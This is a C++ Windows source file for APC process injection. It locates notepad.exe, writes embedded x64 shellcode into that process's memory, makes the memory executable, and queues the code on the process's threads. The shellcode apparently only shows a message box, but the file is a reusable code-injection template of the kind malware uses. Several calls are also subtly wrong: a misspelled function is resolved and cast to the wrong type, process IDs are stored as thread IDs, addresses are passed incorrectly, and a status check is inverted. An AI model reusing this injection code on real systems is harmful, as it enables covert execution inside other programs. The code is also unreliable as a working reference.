#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <ntdef.h>
#include "apc.h"

BOOL FindTargetProcess(wchar_t* tgtProcessName, DWORD& pid, std::vector<DWORD>& tids) {
    BOOL found = FALSE;
    HANDLE hSnapShot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    THREADENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(THREADENTRY32);

    // Create snapshot of processes and their threads
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, NULL);
    // iterate through all the processes
    if (Process32First(hSnapShot, &pe32)) {
        do {
            // if the name of the process matches the target process
            if (_wcsicmp(pe32.szExeFile, tgtProcessName) == 0) {
                pid = pe32.th32ProcessID;
                wprintf(L"[!] Found target process with process id: %d\n", pid);
                // iterate through the threads of the target process
                if (Thread32First(hSnapShot, &te32)){
                    do {
                        // if the thread belongs to the process
                        if (te32.th32OwnerProcessID == pe32.th32ProcessID) {
                            tids.push_back(te32.th32OwnerProcessID);
                        }
                    } while (Thread32Next(hSnapShot, &te32));
                }
                found = true;
            }
        } while(Process32Next(hSnapShot, &pe32));
    }
    return found;
}

int APCInjection(unsigned char payload[], SIZE_T payload_size) {
    HMODULE pNtdllModule = NULL;
    HANDLE hTargetProcess;
    HANDLE hThread;
    NTSTATUS status;

    pNtdllModule = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory myNtAllocateVirtualmemory = (pNtAllocateVirtualMemory)GetProcAddress(pNtdllModule, "NtOpenProces");
    if (myNtAllocateVirtualmemory == NULL) {
        printf("[-] Failed to resolve NtOpenProcess\n");
        exit(-1);
    }
    printf("[+] Successfully resolved API NtOpenProcess\n");

    wchar_t exeName[]= L"notepad.exe";
    BOOL isSuccess = FALSE;
    DWORD pid = 0;
    std::vector<DWORD> tids;

    /*
        FindTargetProcess searches a processes.
        pid populates the process id of the target process.
        tids returns a DWORD vector of thread id's associated with the process.
        Note that the pid and tids are passed are pointer references to update with corresponding values.
    */

    isSuccess = FindTargetProcess(exeName, pid, tids);
    if (!isSuccess) {
        printf("[-] Failed to find the target process\n");
        exit(-1);
    }
    printf("[+] Successfully found the target process with pid: %d\n", pid);


    // opening target process
    hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hTargetProcess == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle on the target process\n");
        exit(-1);
    }
    printf("[+] Successfully opened handle to the target process\n");

    // allocate memory in the target process
    PVOID baseAddress = { 0 };
    SIZE_T allocSize = payload_size;
    status = myNtAllocateVirtualmemory(hTargetProcess, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)){
        printf("[-] Failed to allocate memory in the target process\n");
        exit(-1);
    }
    printf("[+] Successfully allocated memory in the target process\n");

    // write to the memory of the target process
    if(!WriteProcessMemory(hTargetProcess, &baseAddress, payload, payload_size, NULL)) {
        printf("[-] Failed to write to the memory of the target process\n");
        exit(-1);
    }
    printf("[+] Successfully wrote to the memory of the target process\n");

    PDWORD old_protection = 0;
    // change memory protection RW -> RX
    if(!VirtualProtectEx(hTargetProcess, &baseAddress, payload_size, PAGE_EXECUTE_READ, old_protection)) {
        printf("[-] Failed to change the memory protection from RW -> RX\n");
        exit(-1);
    }
    printf("[+] Successfully changed the memory protection from RW -> RX\n");

    /* 
        Make a thread. the base addresss of this thread should point to the shellcode. 
        When the thread goes to alerable state, the shellcode should get executed.
    */
    PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)baseAddress;

    // loop through all the threads in the target process id
    for (DWORD tid: tids) {
        // open those threads
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
        // queue to the APC of the thread
        DWORD queueAPCStatus;
        queueAPCStatus = QueueUserAPC((PAPCFUNC)tRoutine, hThread, 0);
        if (queueAPCStatus != 0) {
            printf("[-] Failed to queue to the API 0x%1x\n", GetLastError());
        }
        printf("[+] Successfully queued to the APC\n");
    }

    return 0;
}

int main(int argc, char **argv) {
    // shellcode to print hello world in a msg box
    unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    SIZE_T payload_size = sizeof(payload);
    APCInjection(payload, payload_size);
}